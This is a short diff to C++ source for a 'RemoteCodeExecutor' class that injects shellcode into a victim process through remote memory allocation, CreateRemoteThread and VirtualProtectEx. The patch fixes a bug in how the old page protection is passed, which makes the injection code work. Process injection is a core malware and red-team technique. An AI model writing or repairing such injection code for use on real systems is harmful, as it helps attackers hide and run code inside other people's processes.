@@ -83,8 +83,6 @@ void RemoteCodeExecutor::InjectShellcode(const uint8_t* shellcode,
     }
 }
 
-
-
 HANDLE RemoteCodeExecutor::CreateThreadInVictim(HANDLE hVictim, LPVOID entry, LPVOID params) {
     HANDLE hThread = CreateRemoteThread(
         hVictim,
@@ -148,8 +146,8 @@ LPVOID RemoteCodeExecutor::AllocateMemoryInVictim(HANDLE hVictim, LPVOID address
 }
 
 void RemoteCodeExecutor::MakeVictimMemoryExecutable(HANDLE hVictim, LPVOID address, SIZE_T size) {
-    PDWORD old_protect{ 0 };
-    if (!VirtualProtectEx(hVictim, address, size, PAGE_EXECUTE_READ, old_protect)) {
+    DWORD old_protect{ PAGE_READWRITE };
+    if (!VirtualProtectEx(hVictim, address, size, PAGE_EXECUTE_READ, &old_protect)) {
         throw std::runtime_error("Can't change victim memory to RX" 
             + std::to_string(GetLastError()));
     }
